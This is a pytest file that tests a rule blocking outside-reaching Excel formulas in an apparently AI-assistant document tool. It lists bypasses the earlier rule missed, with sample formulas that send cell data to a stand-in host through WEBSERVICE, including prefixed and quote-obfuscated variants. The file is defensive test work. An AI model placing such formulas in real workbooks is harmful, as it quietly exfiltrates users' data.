"""The review of "a formula that would reach outside the workbook is never
written" (v1.469.0, excel_formula.for_file over excel_worker.reaches_out).

Three ways round the rule, each red on the first cut:

* the function written with the prefix a FILE stores it under
  (``=_xlfn.WEBSERVICE(...)``): the rule looked for the bare name only, and
  that prefixed spelling is exactly what Excel reads from a saved workbook;
* a sheet name in single quotes that holds a double quote (``'a"b'!A1``):
  the rule took that quote for the start of a text and so never saw the
  call that came after it;
* ``write_document`` with plain text for an .xlsx: a line that starts with
  "=" was stored as a formula without passing the rule at all.
"""

from __future__ import annotations

import asyncio
import hashlib
from pathlib import Path
from types import SimpleNamespace

import pytest
from openpyxl import Workbook, load_workbook

from iron_jarvis.documents.excel_formula import OutsideFormula, for_file, outside_reason
from iron_jarvis.documents.excel_tools import ExcelEditTool
from iron_jarvis.excel_worker import reaches_out
from iron_jarvis.tools.base import ToolContext

PREFIXED = '=_xlfn.WEBSERVICE("https://example.invalid/?d="&A1)'
PREFIXED_TWICE = '=LEN(_xlfn._xlws.WEBSERVICE("https://example.invalid/?d="&A1))'
#: Each double quote inside the two sheet names pairs with a real one, so a
#: reader that knows only double quotes sees no call and no address.
SHIFTED = "=IFERROR('a\"b'!A1,0)&WEBSERVICE(\"http\"&\":\"&\"//example.invalid/?d=\"&B2)&IFERROR('c\"d'!A1,0)"
BAD = [PREFIXED, PREFIXED_TWICE, SHIFTED, "=_XLFN.RTD(\"a\",,\"b\")", "=@_xlfn.IMAGE(\"x\"&A1)"]
FINE = [
    "='a\"b'!A1+1",
    '="it\'s "&A1',
    '=HYPERLINK("https://example.com","site")',
    "=_xlfn.XLOOKUP(A1,B:B,C:C)",
    "='Bob''s \"Q1\"'!B2*2",
    '=IF(A1="WEBSERVICE(",1,0)',
]


def _ctx(ws: Path) -> ToolContext:
    return ToolContext(workspace=ws, session_id="s", agent_run_id="r", config=SimpleNamespace(home=ws), event_bus=None, engine=None)


@pytest.mark.parametrize("formula", BAD)
def test_the_rule_sees_a_prefixed_call_and_a_call_behind_a_quoted_sheet_name(formula):
    assert reaches_out(formula), "the open workbook's rule"
    assert outside_reason(formula), "the saved file's rule"
    with pytest.raises(OutsideFormula):
        for_file(formula)


@pytest.mark.parametrize("formula", FINE)
def test_ordinary_formulas_are_still_written(formula):
    assert reaches_out(formula) == ""
    assert for_file(formula).startswith("=")


def test_a_saved_workbook_never_gets_such_a_formula(tmp_path):
    wb = Workbook()
    wb.active.title = "Data"
    wb.active["A1"] = "client"
    path = tmp_path / "b.xlsx"
    wb.save(path)
    before = hashlib.sha256(path.read_bytes()).hexdigest()
    for formula in (PREFIXED, SHIFTED):
        res = asyncio.run(ExcelEditTool().execute(
            {"path": "b.xlsx", "sheet": "Data", "edits": [{"cell": "F1", "formula": formula}]}, _ctx(tmp_path)))
        assert not res.ok and "is not written from chat" in res.error and res.error.endswith("Nothing was changed."), res.error
    assert hashlib.sha256(path.read_bytes()).hexdigest() == before


def test_the_rule_is_linear_on_a_long_formula():
    import subprocess
    import sys

    code = (
        "import time\n"
        "from iron_jarvis.excel_worker import reaches_out\n"
        "t = time.perf_counter()\n"
        "for s in ('=' + \"'\" * 120001, '=' + '\"' * 120001, '=' + \"'a\" * 60000, '=' + '_xlfn.' * 20000 + 'A1'):\n"
        "    reaches_out(s)\n"
        "print(time.perf_counter() - t)\n"
    )
    out = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=120)
    assert out.returncode == 0, out.stderr
    assert float(out.stdout.strip()) < 20


def _write(tmp_path: Path, content):
    from iron_jarvis.documents.tools import document_tools

    write = {t.name: t for t in document_tools()}["write_document"]
    return asyncio.run(write.execute({"path": "new.xlsx", "content": content}, _ctx(tmp_path)))


def test_plain_text_written_as_a_workbook_passes_the_same_rule(tmp_path):
    res = _write(tmp_path, 'Notes for the file\n=WEBSERVICE("https://example.invalid/?d="&A1)\nend')
    assert not res.ok and "is not written from chat" in res.error
    assert not (tmp_path / "new.xlsx").exists()


def test_a_plain_text_line_that_only_starts_with_an_equals_sign_stays_text(tmp_path):
    res = _write(tmp_path, "=== see the memo ===\n=SUM(1,2)\nplain")
    assert res.ok, res.error
    ws = load_workbook(tmp_path / "new.xlsx").active
    assert ws["A1"].value == "=== see the memo ===" and ws["A1"].data_type == "s"
    assert ws["A2"].value == "=SUM(1,2)" and ws["A2"].data_type == "f"
    assert ws["A3"].value == "plain"
